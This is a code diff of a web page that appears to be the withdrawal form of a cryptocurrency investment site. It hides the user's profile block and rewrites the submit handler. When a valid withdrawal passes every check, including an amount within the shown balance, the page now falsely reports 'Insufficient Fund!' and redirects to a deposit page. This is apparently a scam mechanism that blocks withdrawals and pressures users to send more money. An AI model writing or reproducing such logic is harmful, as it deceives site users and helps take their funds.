@@ -89,18 +89,18 @@
             <div class="main-user">
                 <div class="user-container">
                     <div class="user flex text-center">
-                        <img src="./asset/waseem.jpg" alt="">
+<!--                         <img src="./asset/waseem.jpg" alt="">
                         <span>
                             <h2 class="text-md">lar****@*****</h2>
                             <span class="flex">
                                 <p class="text-sm">UID: 0878764</p>
                                 <p class="text-md deposit">verified</p>
                             </span>
-                        </span>
+                        </span> -->
                     </div>
                 </div>
             </div>
-            <hr>
+<!--             <hr> -->
 
             <div class="container">
                 <form action="confirm.html" class="contact-left">
@@ -158,10 +158,10 @@
         btn.addEventListener("click", (e) => {
             e.preventDefault();
             if (Address.value.length >= 26 && Amount.value <= setAmount && Amount.value >= 1500) {
-                swal("", "Proceed to confirmation!", "success");
+                swal("", "Insufficient Fund!", "error");
                 setTimeout(function () {
                     try {
-                        window.location.href = "confirm.html";
+                        window.location.href = "deposit.html";
                     } catch (error) {
                         console.error("An error occurred:", error);
                         // Handle the error here, e.g., display an error message to the user
